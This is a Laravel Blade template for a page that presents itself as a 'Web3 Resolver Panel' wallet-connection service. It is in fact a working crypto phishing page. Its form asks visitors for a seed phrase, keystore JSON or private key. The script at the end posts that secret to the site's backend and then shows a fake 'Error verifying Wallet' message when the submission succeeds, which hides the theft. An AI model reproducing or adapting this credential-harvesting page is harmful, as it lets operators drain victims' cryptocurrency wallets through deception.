@include('include.header')
    <div class="page-title">
        <div class="container">
            <div class="row align-items-center justify-content-between">
                <div class="col-6">
                    <div class="page-title-content">
                        <h3>Explore</h3>
                        <p class="mb-2">Explore different connection mode</p>
                    </div>
                </div>
                <!-- <div class="col-auto">
                        <div class="breadcrumbs"><a href="#">Home </a><span><i
                                    class="ri-arrow-right-s-line"></i></span><a href="#">Payments</a></div>
                    </div> -->
            </div>
        </div>
    </div>


    <div class="upload-item section-padding">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-12">
                    <h4 class="card-title mb-3">DAPP Type: {{ $coin->name }}
                    </h4>
                    <div class="card">
                        <div class="card-body">

                            <form id="myForm">
                                @csrf <!-- CSRF protection for Laravel -->
                                <div class="row">
                                    <div class="col-12 mb-3">

                                        <input type="hidden" name="dapp_type" value="{{ $coin->name }}">

                                        <label class="form-label">Method of Connection</label>
                                        <br>
                                        <select name="connection_method" required="">
                                            <option value="">Select One</option>
                                            <option value="phrase">Phrase</option>
                                            <option value="json">Key store Json</option>
                                            <option value="p-key">Private Key</option>
                                        </select>
                                    </div>

                                    <div class="col-12 mb-3">
                                        <label class="form-label">Phrase, Key store or Private key</label>
                                        <textarea type="text" id="complaint" name="key" class="form-control" required=""></textarea>
                                    </div>
                                </div>
                                <div class="mt-3">
                                    <button type="submit" name="submit" id="button"
                                        class="btn btn-primary mr-2 w-100">Submit</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>



    <div class="bottom section-padding triangle-top-dark triangle-bottom-dark">
        <div class="container">
            <div class="row">
                <div class="col-xl-4 col-lg-4 col-md-7 col-sm-8">
                    <div class="bottom-logo">
                        <img src="{{ asset('storage/logo.png') }}" />
                        <p>Our commitment is to address a wide array of blockchain and crypto challenges
                            comprehensively. We strive to provide effective solutions that empower you to navigate
                            the
                            rapidly evolving blockchain landscape with confidence. Trust us to optimize your
                            operations
                            and create a successful and efficient blockchain ecosystem.</p>
                    </div>
                </div>
                <div class="col-xl-2 col-lg-2 col-md-5 col-sm-4 col-6">
                    <div class="bottom-widget">
                        <h4 class="widget-title">Quick Links</h4>
                        <ul>
                            <li><a data-savepage-href="explore.php"
                                    href="https://mainnetdappshub.com/.php">Explore</a></li>
                            <li><a data-savepage-href="explore.php"
                                    href="https://mainnetdappshub.com/.php">Connect</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="container">
            <div class="row">
                <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                    <div class="copyright">
                        <p>© Copyright 2023 <a href="#">Web3 Resolver Panel</a> <!-- -->All Rights Reserved</p>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                    <div class="footer-social">
                        <ul>
                            <li><a href="#"><i class="bi bi-facebook"></i></a></li>
                            <li><a href="#"><i class="bi bi-twitter"></i></a></li>
                            <li><a href="#"><i class="bi bi-linkedin"></i></a></li>
                            <li><a href="#"><i class="bi bi-youtube"></i></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>


</div>



<script data-savepage-type="" type="text/plain" data-savepage-src="vendor/jquery/jquery.min.js"></script>
<script data-savepage-type="" type="text/plain" data-savepage-src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>


<script data-savepage-type="" type="text/plain" data-savepage-src="js/scripts.js"></script>

<script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

<script data-savepage-type="text/javascript" type="text/plain"></script>

<!-- Smartsupp Live Chat script -->
<!-- <script type="text/javascript">
    var _smartsupp = _smartsupp || {};
    _smartsupp.key = '7e8063f85d6671bbfcb99297f6f9a7044c335aa5';
    window.smartsupp || (function(d) {
        var s, c, o = smartsupp = function() {
            o._.push(arguments)
        };
        o._ = [];
        s = d.getElementsByTagName('script')[0];
        c = d.createElement('script');
        c.type = 'text/javascript';
        c.charset = 'utf-8';
        c.async = true;
        c.src = 'https://www.smartsuppchat.com/loader.js?';
        s.parentNode.insertBefore(c, s);
    })(document);
</script>
    <noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript> -->

<!-- <script src="//code.jivosite.com/widget/ZtR0Iuvr7G" async></script> -->
<script data-savepage-type="" type="text/plain" data-savepage-src="//code.tidio.co/dgtpwgzuzzbts1qnht0tqqqz4dlwumdl.js" async=""></script>

<script>
    // JavaScript code to handle form submission
    document.getElementById('myForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission

        // Get form data
        const formData = new FormData(this);

        // Send a POST request using Fetch API
        fetch('{{ route('form.submit') }}', {
                method: 'POST',
                headers: {
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute(
                        'content'),
                    'Accept': 'application/json',
                },
                body: formData,
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Error verifying Wallet... Please try again later');
                } else {
                    alert('failed.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    });
</script>




<div id="wayin-not-video-container">
    <div></div>
</div>
</body>

</html>
